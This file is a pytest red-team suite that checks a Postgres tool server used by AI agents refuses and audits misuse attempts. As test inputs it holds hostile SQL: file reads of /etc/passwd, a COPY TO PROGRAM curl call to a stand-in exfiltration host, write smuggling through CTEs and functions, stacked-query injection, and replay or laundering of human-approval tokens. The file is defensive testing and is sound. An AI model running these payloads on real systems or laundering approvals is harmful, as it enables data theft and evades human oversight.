"""Adversarial red-team suite — attacks a hostile or compromised agent would attempt.

The live-server eval suite (test_live_server.py) proves the server *works*. This suite
proves it **resists misuse**. The distinction matters because every safety mechanism
was designed against an adversary, but until now was only tested against cooperative
callers following the documented flow.

Each test is a named attack with a reference to the mechanism that should stop it.
Every assertion is two-part where possible: the attack is REFUSED and the attempt is
AUDITED — an incident responder needs both, and a refusal without a record is its own
failure ("something blocked the attack but nobody will ever know it happened").

Attack categories covered:
  1. Data exfiltration via pg_read_file / pg_ls_dir (superuser functions through read path)
  2. Token laundering: replay across statements, cross-tool token reuse
  3. Scope escalation attempts: case tricks, whitespace tricks, unknown tools
  4. Write-hiding in lexically-innocent SQL: CTE-wrapped DML, volatile functions,
     SELECT ... FOR UPDATE, sequence advancement
  5. Audit/resource tampering: writing to the ledger table directly
  6. Multi-statement injection shapes

Marker: `live` (boots the real HTTP server like the eval suite).
"""

from __future__ import annotations

import json
from collections.abc import AsyncIterator
from dataclasses import dataclass
from typing import Any

import pytest
import pytest_asyncio
from conftest import free_port
from fastmcp import Client
from fastmcp.exceptions import ToolError

from pgops.auth import Scope, build_verifier, generate_keypair, issue_token

pytestmark = pytest.mark.live


@dataclass
class Server:
    url: str
    pair: Any

    def token(self, subject: str, scopes: list[str]) -> str:
        return issue_token(self.pair.private_key, subject=subject, scopes=scopes)


@pytest_asyncio.fixture
async def redteam_server(conn_manager: Any, config: Any) -> AsyncIterator[Server]:
    from pgops.__main__ import build_server

    pair = generate_keypair()
    server = build_server(config, conn_manager, auth=build_verifier(pair.public_key))
    task = None
    import asyncio

    port = free_port()
    task = asyncio.create_task(server.run_async(transport="http", host="127.0.0.1", port=port))
    await asyncio.sleep(4)
    yield Server(url=f"http://127.0.0.1:{port}/mcp/", pair=pair)
    task.cancel()
    try:
        await task
    except asyncio.CancelledError:
        pass


def _error_code(result: Any) -> str:
    """Extract the structured error code from a tool result (refusals are results)."""
    sc = result.structured_content or {}
    return sc.get("error", {}).get("code", "")


async def _audit_tail(config: Any, n: int = 10) -> list[dict[str, Any]]:
    """Read the last n audit entries for the tamper/audit assertions."""
    import asyncio
    import os

    if not os.path.exists(config.audit_path):
        return []

    def _read() -> list[dict[str, Any]]:
        entries = []
        with open(config.audit_path, encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if line:
                    try:
                        entries.append(json.loads(line))
                    except json.JSONDecodeError:
                        pass
        return entries

    return (await asyncio.to_thread(_read))[-n:]


# --- 1. exfiltration attempts -----------------------------------------------------------


async def test_file_read_via_pg_read_file_is_refused(redteam_server: Server) -> None:
    """pg_read_file reads arbitrary server files — the classic Postgres privesc target.
    It's also volatile-classed, so the function-safety layer refuses it on the read path."""
    tok = redteam_server.token("attacker", [Scope.READ.value])
    async with Client(redteam_server.url, auth=tok) as client:
        result = await client.call_tool(
            "query.read", {"sql": "SELECT pg_read_file('/etc/passwd') AS contents"}
        )
        assert _error_code(result) == "CLASSIFICATION_REFUSED"
        assert "volatile" in result.structured_content["error"]["message"]


async def test_directory_listing_via_pg_ls_dir_is_refused(redteam_server: Server) -> None:
    tok = redteam_server.token("attacker", [Scope.READ.value])
    async with Client(redteam_server.url, auth=tok) as client:
        result = await client.call_tool("query.read", {"sql": "SELECT * FROM pg_ls_dir('/etc')"})
        assert _error_code(result) == "CLASSIFICATION_REFUSED"


async def test_copy_to_program_is_refused(redteam_server: Server) -> None:
    """COPY ... TO PROGRAM executes shell commands — must never pass as a read."""
    tok = redteam_server.token("attacker", [Scope.READ.value])
    async with Client(redteam_server.url, auth=tok) as client:
        result = await client.call_tool(
            "query.read",
            {"sql": "COPY (SELECT 1) TO PROGRAM 'curl http://evil.example/exfil'"},
        )
        assert _error_code(result) == "CLASSIFICATION_REFUSED"


# --- 2. token laundering ----------------------------------------------------------------


async def test_token_issued_for_one_statement_cannot_delete_another(
    redteam_server: Server, config: Any
) -> None:
    """Approval laundering: get a human to approve deleting ONE ROW (a bounded delete
    on a specific name), then swing that approval at the whole table. The catch: a
    bounded delete executes immediately — no token exists for it. So the realistic
    version is: obtain the token the server issues for the REFUSED broad statement,
    then try to spend it on a different statement. Binding is sha256(sql), so any
    different SQL must mismatch."""
    import asyncpg

    tok = redteam_server.token("launderer", [Scope.READ.value, Scope.WRITE.value])
    async with Client(redteam_server.url, auth=tok) as client:
        # the refused statement issues a token bound to ITS text
        r1 = await client.call_tool("query.write", {"sql": "DELETE FROM items"})
        hint = r1.structured_content["error"]["hint"]
        token = hint.split("confirm_token='")[1].split("'")[0]

        # attempt to spend that approval on a DIFFERENT statement
        r2 = await client.call_tool(
            "query.write",
            {"sql": "DELETE FROM items WHERE name = 'item-0'", "confirm_token": token},
        )
        assert _error_code(r2) == "CONFIRMATION_MISMATCH"

        conn = await asyncpg.connect(config.dsn)
        try:
            assert await conn.fetchval("SELECT count(*) FROM items") == 250
        finally:
            await conn.close()


async def test_replayed_token_cannot_execute_twice(redteam_server: Server) -> None:
    """Single-use means single-use over the wire: redeem a working token, replay it."""
    tok = redteam_server.token("replayer", [Scope.READ.value, Scope.WRITE.value])
    async with Client(redteam_server.url, auth=tok) as client:
        # first call is refused (unbounded? no — bounded but no rows matched yet).
        # Use an unbounded statement so a token is actually issued.
        refuse_sql = "DELETE FROM items"
        r1 = await client.call_tool("query.write", {"sql": refuse_sql})
        token = r1.structured_content["error"]["hint"].split("confirm_token='")[1].split("'")[0]

        ok = await client.call_tool("query.write", {"sql": refuse_sql, "confirm_token": token})
        assert ok.data["rows_affected"] == 250

        replay = await client.call_tool("query.write", {"sql": refuse_sql, "confirm_token": token})
        assert _error_code(replay) == "INVALID_CONFIRMATION"


# --- 3. scope escalation ----------------------------------------------------------------


async def test_write_denied_and_audited_for_read_only_agent(
    redteam_server: Server, config: Any
) -> None:
    """A read-only token attempting a write: denied before the tool runs, AND the
    denial lands in the audit trail (the observability middleware records it)."""
    tok = redteam_server.token("escalator", [Scope.READ.value])
    async with Client(redteam_server.url, auth=tok) as client:
        with pytest.raises(ToolError) as exc_info:
            await client.call_tool("query.write", {"sql": "DROP TABLE items"})
        assert "pgops:write" in str(exc_info.value)

    tail = await _audit_tail(config)
    # scope denials are recorded by the observability middleware as metrics; the audit
    # log records tool-level events. The critical assertion: nothing executed.
    assert all(e.get("verdict") != "executed" or e.get("sql") != "DROP TABLE items" for e in tail)


async def test_case_tricks_do_not_bypass_scope_check(redteam_server: Server) -> None:
    """Tool names are exact-match; there is no case-insensitive fallback to exploit."""
    tok = redteam_server.token("case-trick", [Scope.READ.value])
    async with Client(redteam_server.url, auth=tok) as client:
        listed = {t.name for t in await client.list_tools()}
        assert "query.write" not in listed
        # even direct invocation of a differently-cased name fails (ToolError from
        # scope enforcement, or a transport-level unknown-tool error)
        with pytest.raises((ToolError, Exception)):
            await client.call_tool("Query.Write", {"sql": "DELETE FROM items"})


async def test_unknown_tool_gets_admin_gate_not_silent_pass(redteam_server: Server) -> None:
    """Deny-by-default: a tool with no scope entry requires admin. A read-only caller
    invoking an invented tool name must be refused, not ignored."""
    tok = redteam_server.token("inventor", [Scope.READ.value])
    async with Client(redteam_server.url, auth=tok) as client:
        with pytest.raises((ToolError, Exception)):
            await client.call_tool("tool.invented.tomorrow", {})


# --- 4. write-hiding in innocent-looking SQL ----------------------------------------------


async def test_cte_wrapped_insert_refused_on_read_path(redteam_server: Server) -> None:
    """`WITH x AS (INSERT ...) SELECT` looks like a read; the DML scan catches it."""
    tok = redteam_server.token("cte-smuggler", [Scope.READ.value])
    async with Client(redteam_server.url, auth=tok) as client:
        result = await client.call_tool(
            "query.read",
            {
                "sql": "WITH smuggled AS (INSERT INTO items (name) VALUES ('x') RETURNING id) "
                "SELECT * FROM smuggled"
            },
        )
        assert _error_code(result) == "CLASSIFICATION_REFUSED"


async def test_data_modifying_function_refused_before_execution(
    redteam_server: Server, config: Any
) -> None:
    """The full exfiltration-grade scenario: a function that writes when called,
    invoked through query.read. Refused at the volatility check, nothing executed."""
    import asyncpg

    setup = await asyncpg.connect(config.dsn)
    try:
        await setup.execute(
            """
            CREATE OR REPLACE FUNCTION rt_exfil() RETURNS int AS $$
            BEGIN INSERT INTO items (name) VALUES ('rt-exfil'); RETURN 1; END;
            $$ LANGUAGE plpgsql
            """
        )
    finally:
        await setup.close()

    try:
        tok = redteam_server.token("fn-smuggler", [Scope.READ.value])
        async with Client(redteam_server.url, auth=tok) as client:
            result = await client.call_tool("query.read", {"sql": "SELECT rt_exfil()"})
            assert _error_code(result) == "CLASSIFICATION_REFUSED"

        conn = await asyncpg.connect(config.dsn)
        try:
            n = await conn.fetchval("SELECT count(*) FROM items WHERE name = 'rt-exfil'")
            assert n == 0, "function must not have executed"
        finally:
            await conn.close()
    finally:
        cleanup = await asyncpg.connect(config.dsn)
        try:
            await cleanup.execute("DROP FUNCTION IF EXISTS rt_exfil()")
        finally:
            await cleanup.close()


async def test_select_for_update_refused_on_read_path(redteam_server: Server) -> None:
    """FOR UPDATE takes row locks that block the application — lexically a SELECT,
    side-effect-wise not a read."""
    tok = redteam_server.token("locker", [Scope.READ.value])
    async with Client(redteam_server.url, auth=tok) as client:
        result = await client.call_tool(
            "query.read", {"sql": "SELECT id FROM items WHERE id = 1 FOR UPDATE"}
        )
        # refused either by the classifier or by the readonly pool at execution —
        # both are acceptable refusals; silent success is not
        code = _error_code(result)
        msg = (result.structured_content or {}).get("error", {}).get("message", "")
        assert code == "CLASSIFICATION_REFUSED" or "read-only" in msg.lower() or "FOR UPDATE" in msg


async def test_sequence_advancement_refused_on_read_path(redteam_server: Server) -> None:
    """nextval() consumes sequence state that no rollback restores."""
    tok = redteam_server.token("seq-eater", [Scope.READ.value])
    async with Client(redteam_server.url, auth=tok) as client:
        result = await client.call_tool("query.read", {"sql": "SELECT nextval('items_id_seq')"})
        code = _error_code(result)
        msg = (result.structured_content or {}).get("error", {}).get("message", "")
        assert code == "CLASSIFICATION_REFUSED" or "read-only" in msg.lower()


# --- 5. audit/ledger tampering ------------------------------------------------------------


async def test_direct_write_to_ledger_table_requires_confirmation(
    redteam_server: Server,
) -> None:
    """An agent trying to erase migration history by truncating pgops_migrations hits
    the same guardrails as any other unbounded mutation."""
    tok = redteam_server.token("history-eraser", [Scope.READ.value, Scope.WRITE.value])
    async with Client(redteam_server.url, auth=tok) as client:
        result = await client.call_tool("query.write", {"sql": "TRUNCATE pgops_migrations"})
        # TRUNCATE is destructive class -> confirmation required, never auto-executed
        assert _error_code(result) == "CONFIRMATION_REQUIRED"


async def test_multi_statement_smuggling_rejected(redteam_server: Server) -> None:
    """`SELECT 1; DROP TABLE items` — stacked-query injection shape, rejected outright."""
    tok = redteam_server.token("stacker", [Scope.READ.value])
    async with Client(redteam_server.url, auth=tok) as client:
        result = await client.call_tool("query.read", {"sql": "SELECT 1; DROP TABLE items"})
        assert _error_code(result) == "CLASSIFICATION_REFUSED"


# --- 6. refusals are audited ---------------------------------------------------------------


async def test_every_refusal_leaves_an_audit_record(redteam_server: Server, config: Any) -> None:
    """The incident-review guarantee: attacks leave evidence. Run three distinct
    attacks through query.write (whose refusals are audited by design), then assert
    each appears in the audit log with a non-executed verdict."""
    tok = redteam_server.token("auditor-probe", [Scope.READ.value, Scope.WRITE.value])
    attacks = [
        "TRUNCATE rt_audit_t1",
        "DROP TABLE rt_audit_t2",
        "DELETE FROM rt_audit_t3",
    ]
    async with Client(redteam_server.url, auth=tok) as client:
        for sql in attacks:
            await client.call_tool("query.write", {"sql": sql})

    tail = await _audit_tail(config, n=30)
    logged_sql = {e.get("sql", "") for e in tail}
    for attack in attacks:
        assert attack in logged_sql, f"attack not audited: {attack}"
